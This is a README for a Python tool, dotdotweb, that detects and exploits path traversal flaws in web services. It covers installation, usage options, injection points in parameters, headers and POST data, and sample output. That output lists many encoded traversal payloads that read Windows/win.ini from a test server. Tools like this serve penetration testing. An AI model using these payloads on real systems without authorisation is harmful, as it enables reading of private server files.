dotdotfarm
==========

[![forthebadge](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTkuMDE5OTk5OTk5OTk5OTgiIGhlaWdodD0iMzUiIHZpZXdCb3g9IjAgMCAxNTkuMDE5OTk5OTk5OTk5OTggMzUiPjxyZWN0IGNsYXNzPSJzdmdfX3JlY3QiIHg9IjAiIHk9IjAiIHdpZHRoPSI5NC40MSIgaGVpZ2h0PSIzNSIgZmlsbD0iIzMxQzRGMyIvPjxyZWN0IGNsYXNzPSJzdmdfX3JlY3QiIHg9IjkyLjQxIiB5PSIwIiB3aWR0aD0iNjYuNjEiIGhlaWdodD0iMzUiIGZpbGw9IiMzODlBRDUiLz48cGF0aCBjbGFzcz0ic3ZnX190ZXh0IiBkPSJNMTYuNTEgMjJMMTMuNDYgMTMuNDdMMTUuMDggMTMuNDdMMTcuMjIgMjAuMTRMMTkuMzkgMTMuNDdMMjEuMDIgMTMuNDdMMTcuOTUgMjJMMTYuNTEgMjJaTTMwLjU1IDIyTDI0Ljk3IDIyTDI0Ljk3IDEzLjQ3TDMwLjUxIDEzLjQ3TDMwLjUxIDE0LjY2TDI2LjQ1IDE0LjY2TDI2LjQ1IDE3LjAyTDI5Ljk2IDE3LjAyTDI5Ljk2IDE4LjE5TDI2LjQ1IDE4LjE5TDI2LjQ1IDIwLjgyTDMwLjU1IDIwLjgyTDMwLjU1IDIyWk0zNi4yMyAyMkwzNC43NCAyMkwzNC43NCAxMy40N0wzNy43NCAxMy40N1EzOS4yMiAxMy40NyA0MC4wMiAxNC4xM1E0MC44MiAxNC43OSA0MC44MiAxNi4wNUw0MC44MiAxNi4wNVE0MC44MiAxNi45MCA0MC40MSAxNy40OFE0MC4wMCAxOC4wNiAzOS4yNiAxOC4zN0wzOS4yNiAxOC4zN0w0MS4xOCAyMS45Mkw0MS4xOCAyMkwzOS41OSAyMkwzNy44OCAxOC43MUwzNi4yMyAxOC43MUwzNi4yMyAyMlpNMzYuMjMgMTQuNjZMMzYuMjMgMTcuNTJMMzcuNzUgMTcuNTJRMzguNTAgMTcuNTIgMzguOTIgMTcuMTVRMzkuMzQgMTYuNzcgMzkuMzQgMTYuMTFMMzkuMzQgMTYuMTFRMzkuMzQgMTUuNDMgMzguOTUgMTUuMDVRMzguNTYgMTQuNjggMzcuNzkgMTQuNjZMMzcuNzkgMTQuNjZMMzYuMjMgMTQuNjZaTTQ0Ljc5IDE5LjQyTDQ0Ljc5IDE5LjQyTDQ2LjI3IDE5LjQyUTQ2LjI3IDIwLjE1IDQ2Ljc1IDIwLjU1UTQ3LjIzIDIwLjk1IDQ4LjEzIDIwLjk1TDQ4LjEzIDIwLjk1UTQ4LjkwIDIwLjk1IDQ5LjI5IDIwLjYzUTQ5LjY4IDIwLjMyIDQ5LjY4IDE5LjgwTDQ5LjY4IDE5LjgwUTQ5LjY4IDE5LjI0IDQ5LjI4IDE4Ljk0UTQ4Ljg5IDE4LjYzIDQ3Ljg2IDE4LjMyUTQ2LjgyIDE4LjAxIDQ2LjIyIDE3LjYzTDQ2LjIyIDE3LjYzUTQ1LjA1IDE2LjkwIDQ1LjA1IDE1LjcyTDQ1LjA1IDE1LjcyUTQ1LjA1IDE0LjY5IDQ1Ljg5IDE0LjAyUTQ2LjczIDEzLjM1IDQ4LjA3IDEzLjM1TDQ4LjA3IDEzLjM1UTQ4Ljk2IDEzLjM1IDQ5LjY2IDEzLjY4UTUwLjM2IDE0LjAxIDUwLjc2IDE0LjYxUTUxLjE1IDE1LjIyIDUxLjE1IDE1Ljk2TDUxLjE1IDE1Ljk2TDQ5LjY4IDE1Ljk2UTQ5LjY4IDE1LjI5IDQ5LjI2IDE0LjkxUTQ4Ljg0IDE0LjU0IDQ4LjA2IDE0LjU0TDQ4LjA2IDE0LjU0UTQ3LjMzIDE0LjU0IDQ2LjkzIDE0Ljg1UTQ2LjUzIDE1LjE2IDQ2LjUzIDE1LjcxTDQ2LjUzIDE1LjcxUTQ2LjUzIDE2LjE4IDQ2Ljk3IDE2LjUwUTQ3LjQwIDE2LjgxIDQ4LjM5IDE3LjEwUTQ5LjM5IDE3LjQwIDQ5Ljk5IDE3Ljc4UTUwLjYwIDE4LjE2IDUwLjg4IDE4LjY1UTUxLjE2IDE5LjEzIDUxLjE2IDE5Ljc5TDUxLjE2IDE5Ljc5UTUxLjE2IDIwLjg2IDUwLjM0IDIxLjQ5UTQ5LjUzIDIyLjEyIDQ4LjEzIDIyLjEyTDQ4LjEzIDIyLjEyUTQ3LjIwIDIyLjEyIDQ2LjQyIDIxLjc3UTQ1LjY1IDIxLjQzIDQ1LjIyIDIwLjgzUTQ0Ljc5IDIwLjIyIDQ0Ljc5IDE5LjQyWk01Ny4wMSAyMkw1NS41NCAyMkw1NS41NCAxMy40N0w1Ny4wMSAxMy40N0w1Ny4wMSAyMlpNNjEuNTYgMTguMDBMNjEuNTYgMTguMDBMNjEuNTYgMTcuNTJRNjEuNTYgMTYuMjggNjIuMDAgMTUuMzJRNjIuNDQgMTQuMzcgNjMuMjUgMTMuODZRNjQuMDUgMTMuMzUgNjUuMDkgMTMuMzVRNjYuMTQgMTMuMzUgNjYuOTQgMTMuODVRNjcuNzUgMTQuMzUgNjguMTkgMTUuMjlRNjguNjMgMTYuMjMgNjguNjMgMTcuNDhMNjguNjMgMTcuNDhMNjguNjMgMTcuOTZRNjguNjMgMTkuMjEgNjguMjAgMjAuMTZRNjcuNzcgMjEuMTAgNjYuOTYgMjEuNjFRNjYuMTUgMjIuMTIgNjUuMTEgMjIuMTJMNjUuMTEgMjIuMTJRNjQuMDcgMjIuMTIgNjMuMjYgMjEuNjFRNjIuNDUgMjEuMTAgNjIuMDAgMjAuMTdRNjEuNTYgMTkuMjMgNjEuNTYgMTguMDBaTTYzLjA0IDE3LjQ2TDYzLjA0IDE3Ljk2UTYzLjA0IDE5LjM2IDYzLjU5IDIwLjEzUTY0LjEzIDIwLjkwIDY1LjExIDIwLjkwTDY1LjExIDIwLjkwUTY2LjA5IDIwLjkwIDY2LjYyIDIwLjE1UTY3LjE1IDE5LjQwIDY3LjE1IDE3Ljk2TDY3LjE1IDE3Ljk2TDY3LjE1IDE3LjUxUTY3LjE1IDE2LjA5IDY2LjYxIDE1LjM0UTY2LjA4IDE0LjU4IDY1LjA5IDE0LjU4TDY1LjA5IDE0LjU4UTY0LjEzIDE0LjU4IDYzLjU5IDE1LjMzUTYzLjA1IDE2LjA5IDYzLjA0IDE3LjQ2TDYzLjA0IDE3LjQ2Wk03NC41OCAyMkw3My4xMCAyMkw3My4xMCAxMy40N0w3NC41OCAxMy40N0w3OC4zOSAxOS41NEw3OC4zOSAxMy40N0w3OS44NyAxMy40N0w3OS44NyAyMkw3OC4zOCAyMkw3NC41OCAxNS45NUw3NC41OCAyMloiIGZpbGw9IiNGRkZGRkYiLz48cGF0aCBjbGFzcz0ic3ZnX190ZXh0IiBkPSJNMTA3LjM5IDE1LjQ0TDEwNS44MyAxNS40NEwxMDUuODMgMTMuNjBMMTA5Ljc3IDEzLjYwTDEwOS43NyAyMkwxMDcuMzkgMjJMMTA3LjM5IDE1LjQ0Wk0xMTQuNDMgMjAuNzVMMTE0LjQzIDIwLjc1UTExNC40MyAyMC4xNSAxMTQuODIgMTkuNzhRMTE1LjIxIDE5LjQxIDExNS44MCAxOS40MUwxMTUuODAgMTkuNDFRMTE2LjM5IDE5LjQxIDExNi43OCAxOS43OFExMTcuMTYgMjAuMTUgMTE3LjE2IDIwLjc1TDExNy4xNiAyMC43NVExMTcuMTYgMjEuMzQgMTE2Ljc3IDIxLjcyUTExNi4zOCAyMi4xMSAxMTUuODAgMjIuMTFMMTE1LjgwIDIyLjExUTExNS4yMiAyMi4xMSAxMTQuODIgMjEuNzJRMTE0LjQzIDIxLjM0IDExNC40MyAyMC43NVpNMTIxLjA4IDIxLjM0TDEyMS4wOCAyMS4zNEwxMjEuOTMgMTkuNTVRMTIyLjQ0IDE5Ljg4IDEyMy4wNCAyMC4wN1ExMjMuNjUgMjAuMjUgMTI0LjI2IDIwLjI1TDEyNC4yNiAyMC4yNVExMjQuODcgMjAuMjUgMTI1LjIzIDIwLjAxUTEyNS42MCAxOS43OCAxMjUuNjAgMTkuMzZMMTI1LjYwIDE5LjM2UTEyNS42MCAxOC45NCAxMjUuMjQgMTguNzJRMTI0Ljg4IDE4LjUxIDEyMy45NyAxOC41MUwxMjMuOTcgMTguNTFMMTIxLjY5IDE4LjUxTDEyMi4xMSAxMy42MEwxMjcuNDYgMTMuNjBMMTI3LjQ2IDE1LjQ0TDEyNC4wOCAxNS40NEwxMjMuOTcgMTYuNjZMMTI0LjUzIDE2LjY2UTEyNi4zMCAxNi42NiAxMjcuMTQgMTcuMzhRMTI3Ljk5IDE4LjEwIDEyNy45OSAxOS4zMEwxMjcuOTkgMTkuMzBRMTI3Ljk5IDIwLjA4IDEyNy41OSAyMC43M1ExMjcuMTkgMjEuMzkgMTI2LjM2IDIxLjc4UTEyNS41NCAyMi4xNyAxMjQuMzMgMjIuMTdMMTI0LjMzIDIyLjE3UTEyMy40NCAyMi4xNyAxMjIuNTcgMjEuOTVRMTIxLjcwIDIxLjc0IDEyMS4wOCAyMS4zNFpNMTMyLjA3IDIwLjc1TDEzMi4wNyAyMC43NVExMzIuMDcgMjAuMTUgMTMyLjQ2IDE5Ljc4UTEzMi44NSAxOS40MSAxMzMuNDUgMTkuNDFMMTMzLjQ1IDE5LjQxUTEzNC4wNCAxOS40MSAxMzQuNDMgMTkuNzhRMTM0LjgxIDIwLjE1IDEzNC44MSAyMC43NUwxMzQuODEgMjAuNzVRMTM0LjgxIDIxLjM0IDEzNC40MiAyMS43MlExMzQuMDMgMjIuMTEgMTMzLjQ1IDIyLjExTDEzMy40NSAyMi4xMVExMzIuODcgMjIuMTEgMTMyLjQ3IDIxLjcyUTEzMi4wNyAyMS4zNCAxMzIuMDcgMjAuNzVaTTEzOS4wNCAxNy44MEwxMzkuMDQgMTcuODBRMTM5LjA0IDE2LjQ1IDEzOS41MSAxNS40NlExMzkuOTggMTQuNDYgMTQwLjgzIDEzLjk1UTE0MS42NyAxMy40MyAxNDIuNzQgMTMuNDNMMTQyLjc0IDEzLjQzUTE0My44MSAxMy40MyAxNDQuNjUgMTMuOTVRMTQ1LjQ5IDE0LjQ2IDE0NS45NyAxNS40NlExNDYuNDQgMTYuNDUgMTQ2LjQ0IDE3LjgwTDE0Ni40NCAxNy44MFExNDYuNDQgMTkuMTUgMTQ1Ljk3IDIwLjE1UTE0NS40OSAyMS4xNCAxNDQuNjUgMjEuNjVRMTQzLjgyIDIyLjE3IDE0Mi43NCAyMi4xN0wxNDIuNzQgMjIuMTdRMTQxLjY3IDIyLjE3IDE0MC44MyAyMS42NVExMzkuOTggMjEuMTQgMTM5LjUxIDIwLjE1UTEzOS4wNCAxOS4xNiAxMzkuMDQgMTcuODBaTTE0MS40MyAxNy44MEwxNDEuNDMgMTcuODBRMTQxLjQzIDE5LjA2IDE0MS43OCAxOS42NFExNDIuMTMgMjAuMjIgMTQyLjc0IDIwLjIyTDE0Mi43NCAyMC4yMlExNDMuMzUgMjAuMjIgMTQzLjcwIDE5LjY0UTE0NC4wNiAxOS4wNiAxNDQuMDYgMTcuODBMMTQ0LjA2IDE3LjgwUTE0NC4wNiAxNi41NCAxNDMuNzAgMTUuOTZRMTQzLjM1IDE1LjM4IDE0Mi43NCAxNS4zOEwxNDIuNzQgMTUuMzhRMTQyLjEzIDE1LjM4IDE0MS43OCAxNS45NlExNDEuNDMgMTYuNTQgMTQxLjQzIDE3LjgwWiIgZmlsbD0iI0ZGRkZGRiIgeD0iMTA1LjQxIi8+PC9zdmc+)](https://forthebadge.com)
Utility for detection & exploitation of Path Traversal vulnerabilities in various network services

dotdotweb - PT tool for HTTP services


Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make up to ~3K requests per second

Features
========
- async client for parallel requesting of target (speedup)
- ability to fetch files' content after succeeding a payload
- specifying payload in any part of query (url, headers or POST data)
- using callbacks for future handling of results

Installation
============
```bash
git clone https://github.com/treddis/dotdotfarm.git
cd dotdotfarm
pip install -r requirements.txt
pip3 install .
```

Usage
=====
```bash
usage: dotdotweb.py [-h] [-o {windows,linux}] [-D DEPTH] [-t TIMEOUT]
                    [-f FILE] [-R] [-fs FS] [-fc FC] [-H HEADERS] [-d DATA]
                    [-m {get,post,put,trace,delete}]
                    url

path traversal identificator & exploit

positional arguments:
  url                   url for testing

options:
  -h, --help            show this help message and exit
  -o {windows,linux}, --os-type {windows,linux}
  -D DEPTH, --depth DEPTH
                        depth of PT searching
  -t TIMEOUT, --timeout TIMEOUT
                        timeout of connections
  -f FILE, --file FILE  specific file for PT detection
  -R, --print-files     read traversed files
  -fs FS                filter output by size
  -fc FC                filter output by response code
  -H HEADERS, --header HEADERS
                        specify header for requests
  -d DATA, --data DATA  specify POST data
  -m {get,post,put,trace,delete}, --method {get,post,put,trace,delete}
                        used HTTP method for requests
```
```bash

    .___      __      .___      __    _____
  __| _/_____/  |_  __| _/_____/  |__/ ____\____ _______  _____
 / __ |/  _ \   __\/ __ |/  _ \   __\   __\\__  \\_  __ \/     \
/ /_/ (  <_> )  | / /_/ (  <_> )  |  |  |   / __ \|  | \/  Y Y  \
\____ |\____/|__| \____ |\____/|__|  |__|  (____  /__|  |__|_|  /
     \/                \/                       \/            \/

usage: dotdotweb.py [-h] [-V] [-A] [-R] [-o {windows,linux}] [--delay DELAY] [-d DEPTH] [-t TIMEOUT] [-f FILE]
                    [-fs FS] [-fc FC] [-H HEADERS] [--data DATA] [-m {get,post,put,trace,delete}]
                    url

fast path traversal identificator & exploit

positional arguments:
  url                   target URL

options:
  -h, --help            show this help message and exit
  -V, --version         print version of the tool
  -A, --all             try all files after successfull exploitation (default false)
  -R, --print-files     read traversed files (default false)
  -o {windows,linux}, --os-type {windows,linux}
                        target OS type (default all)
  --delay DELAY         make delays between requests in milliseconds (default 0)
  -d DEPTH, --depth DEPTH
                        depth of PT searching (default 5)
  -t TIMEOUT, --timeout TIMEOUT
                        timeout of connections (default 60)
  -f FILE, --file FILE  specific file for PT detection
  -fs FS                filter output by size
  -fc FC                filter output by response code
  -H HEADERS, --header HEADERS
                        custom header for requests
  --data DATA           specify POST data
  -m {get,post,put,trace,delete}, --method {get,post,put,trace,delete}
                        used HTTP method for requests
```

Passing in GET parameters
----------------------
Passing brute parameters via `?par=val` pairs:
```bash
dotdotweb -o windows -fc 500 \ 
          http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
```

Passing via headers
-------------------
Passing brute parameters via `Origin: master=FUZZ` pairs:
```bash
dotdotweb -o linux -fc 500,404 -H "Referer: https://www.google.com/path?q=FUZZ" \
          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

Passing via POST data
---------------------
Passing brute parameters via POST data parameters
```bash
dotdotweb -o linux -fc 500 -fs 111 -d "key0=val0&key1=val1" \
          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

Example output
==============
```bash
dotdotweb -o windows "http://localhost:8080/pathtrav?query=FUZZ" 

    .___      __      .___      __    _____
  __| _/_____/  |_  __| _/_____/  |__/ ____\____ _______  _____
 / __ |/  _ \   __\/ __ |/  _ \   __\   __\\__  \\_  __ \/     \
/ /_/ (  <_> )  | / /_/ (  <_> )  |  |  |   / __ \|  | \/  Y Y  \
\____ |\____/|__| \____ |\____/|__|  |__|  (____  /__|  |__|_|  /
     \/                \/                       \/            \/

[*] Started at Sun Jan 22 19:32:46 2023
 ../../../Windows/win.ini                                                   [Status: 200, Size: 111]
 ../Windows/win.ini                                                         [Status: 200, Size: 111]
 ..\Windows\win.ini                                                         [Status: 200, Size: 111]
 ..%2fWindows%2fwin.ini                                                     [Status: 200, Size: 111]
 ..\..\..\Windows\win.ini                                                   [Status: 200, Size: 111]
 ..%5c..%5c..%5cWindows%5cwin.ini                                           [Status: 200, Size: 111]
 ..%5cWindows%5cwin.ini                                                     [Status: 200, Size: 111]
 .%2e/Windows/win.ini                                                       [Status: 200, Size: 111]
 .%2e\Windows\win.ini                                                       [Status: 200, Size: 111]
 .%2e%2fWindows%2fwin.ini                                                   [Status: 200, Size: 111]
 .%2e%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
 %5C..%5cWindows%5cwin.ini                                                  [Status: 200, Size: 111]
 f%5C..%2fWindows%2fwin.ini                                                 [Status: 200, Size: 111]
 %5C../Windows/win.ini                                                      [Status: 200, Size: 111]
 %5C..\%5C..\%5C..\Windows\win.ini                                          [Status: 200, Size: 111]
 .%2e\.%2e\.%2e\Windows\win.ini                                             [Status: 200, Size: 111]
 .%2e%5c.%2e%5c.%2e%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
 %5C..%2f%5C..%2f%5C..%2fWindows%2fwin.ini                                  [Status: 200, Size: 111]
 %5C../%5C../%5C../Windows/win.ini                                          [Status: 200, Size: 111]
 %5C..%5c%5C..%5c%5C..%5cWindows%5cwin.ini                                  [Status: 200, Size: 111]
 %2e./Windows/win.ini                                                       [Status: 200, Size: 111]
 %2e./%2e./%2e./Windows/win.ini                                             [Status: 200, Size: 111]
 %2e.%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
 %2e.%5c%2e.%5c%2e.%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
 .%2e%2f.%2e%2f.%2e%2fWindows%2fwin.ini                                     [Status: 200, Size: 111]
100%|██████████████████████████████████████████████████████████| 6960/6960 [00:12<00:00, 575.63it/s]
[*] Ended at Sun Jan 22 19:32:58 2023 (11 seconds)
```

Limitations
===========
- Python 3.8+
- ~~High speed of requests rate can trigger WAF of you target~~
- Unable to pass own dictionary for payload generator
- No way to flexibly forge payloads
- ~~Need of OS specifying~~
